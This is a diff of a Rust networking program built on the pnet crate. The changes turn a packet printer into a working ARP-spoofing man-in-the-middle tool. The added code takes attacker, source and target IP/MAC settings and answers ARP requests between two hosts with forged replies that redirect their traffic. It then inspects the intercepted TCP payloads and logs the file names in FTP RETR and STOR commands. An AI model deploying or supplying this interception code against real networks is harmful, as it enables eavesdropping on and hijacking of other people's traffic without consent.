@@ -1,6 +1,5 @@
 extern crate pnet;
 
-
 use std::net::Ipv4Addr;
 
 use pnet::datalink::{self, Channel::Ethernet};
@@ -15,8 +14,16 @@ use pnet::packet::udp::UdpPacket;
 use pnet::packet::{MutablePacket, Packet};
 use pnet::util::MacAddr;
 
-pub fn read_network_interface(interface_name: String) {
-    let interface_names_match = |iface: &datalink::NetworkInterface| iface.name == interface_name;
+pub struct Config {
+    pub ip_src: Ipv4Addr,
+    pub mac_src: MacAddr,
+    pub ip_target: Ipv4Addr,
+    pub mac_target: MacAddr,
+    pub interface_name: String,
+}
+
+pub fn read_network_interface(config: &Config) {
+    let interface_names_match = |iface: &datalink::NetworkInterface| iface.name == config.interface_name;
 
     // Find the network interface with the provided name
     let interfaces = datalink::interfaces();
@@ -32,7 +39,7 @@ pub fn read_network_interface(interface_name: String) {
         Err(e) => panic!("Error creating datalink channel: {}", e),
     };
 
-    println!("Listening on {}", interface_name);
+    println!("Listening on {}", config.interface_name);
 
     loop {
         match rx.next() {
@@ -41,14 +48,40 @@ pub fn read_network_interface(interface_name: String) {
                 // do not print packets from and for 00:00:00:00:00:00
                 if packet.get_destination() == MacAddr::new(0, 0, 0, 0, 0, 0) || packet.get_source() == MacAddr::new(0, 0, 0, 0, 0, 0) {
                     continue;
-                }
-                println!("{} -> {} ({})", packet.get_source(), packet.get_destination(), get_ethernet_type(&packet));
-                // print packet only if it is an ARP or a tcp packet
-                if get_ethernet_type(&packet) != "IPv4" {
+                } else if packet.get_ethertype() != EtherTypes::Arp && packet.get_ethertype() != EtherTypes::Ipv4 {
                     continue;
                 }
-                print_packet(&packet);
-                println!();
+                if packet.get_source() != config.mac_target && packet.get_source() != config.mac_src {
+                    continue;
+                }
+
+                // if the packet is an ARP packet request sent to the target or the source
+                // send a reply to the source with the MAC address of the attacker
+                if packet.get_ethertype() == EtherTypes::Arp {
+                    let arp_packet = ArpPacket::new(packet.payload()).unwrap();
+                    if arp_packet.get_operation() == ArpOperations::Request {
+                        if arp_packet.get_sender_proto_addr() == config.ip_src {
+                            arp_spoof(arp_packet.get_sender_proto_addr(), arp_packet.get_sender_hw_addr(), config.ip_target, &config.interface_name);
+                        } else if arp_packet.get_sender_proto_addr() == config.ip_target {
+                            arp_spoof(arp_packet.get_sender_proto_addr(), arp_packet.get_sender_hw_addr(), config.ip_src, &config.interface_name);
+                        }
+                    }
+                } else if packet.get_ethertype() == EtherTypes::Ipv4 {
+                    if let Some(ipv4_packet) = Ipv4Packet::new(packet.payload()) {
+                        if ipv4_packet.get_next_level_protocol() == IpNextHeaderProtocols::Tcp {
+                            if let Some(tcp_packet) = TcpPacket::new(ipv4_packet.payload()) {
+                                // get the payload of the TCP packet as a string
+                                let payload = String::from_utf8_lossy(tcp_packet.payload());
+                                let filename = get_filename_ftp(&payload.to_string());
+                                if filename != "" {
+                                    println!("📦 {}:{} to {}:{}", ipv4_packet.get_source(), tcp_packet.get_source(), ipv4_packet.get_destination(), tcp_packet.get_destination());
+                                    println!("Filename: {}", filename);
+                                    println!();
+                                }
+                            }
+                        }
+                    }
+                }
             },
             Err(e) => {
                 println!("An error occurred while reading packet: {}", e);
@@ -135,17 +168,6 @@ pub fn print_packet(packet: &EthernetPacket) {
     }
 }
 
-/// Function that gets a ethernet packet and return the type of the packet
-/// like ARP, IP, etc.
-pub fn get_ethernet_type(packet: &EthernetPacket) -> String {
-    match packet.get_ethertype() {
-        EtherTypes::Arp => "ARP".to_string(),
-        EtherTypes::Ipv4 => "IPv4".to_string(),
-        EtherTypes::Ipv6 => "IPv6".to_string(),
-        _ => format!("Other({})", packet.get_ethertype())
-    }
-}
-
 /// Function that sends a ARP reply
 /// arguments:
 /// - target_ip: the IP address of the target
@@ -173,8 +195,8 @@ pub fn arp_reply(target_ip: Ipv4Addr, target_mac: MacAddr, src_ip: Ipv4Addr, src
     ethernet_packet.set_source(src_mac);
     ethernet_packet.set_ethertype(EtherTypes::Arp);
 
-    println!("Sending ARP reply to {} ({})", target_ip, target_mac);
-    println!("From {} ({})", src_ip, src_mac);
+    //println!("Sending ARP reply to {} ({})", target_ip, target_mac);
+    //println!("From {} ({})", src_ip, src_mac);
 
     let mut arp_buffer = [0u8; 28];
     let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
@@ -210,4 +232,21 @@ pub fn arp_spoof(target_ip: Ipv4Addr, target_mac: MacAddr, source_ip: Ipv4Addr, 
     let source_mac = interface.mac.unwrap();
     
     arp_reply(target_ip, target_mac, source_ip, source_mac, interface_name);
+}
+
+/// Gets a string that is the raw content of a ftp packet
+/// prints the filname of the file sent or received
+/// it should match the pattern: "RETR filename" or "STOR filename"
+fn get_filename_ftp(payload: &String) -> String {
+    let mut filename = String::new();
+    let iter = payload.split_whitespace();
+    // convert iter to vector
+    let iter = iter.collect::<Vec<&str>>();
+    if iter.len() < 2 {
+        return filename;
+    }
+    if iter[0] == "RETR" || iter[0] == "STOR" {
+        filename = iter[1].to_string();
+    }
+    filename
 }
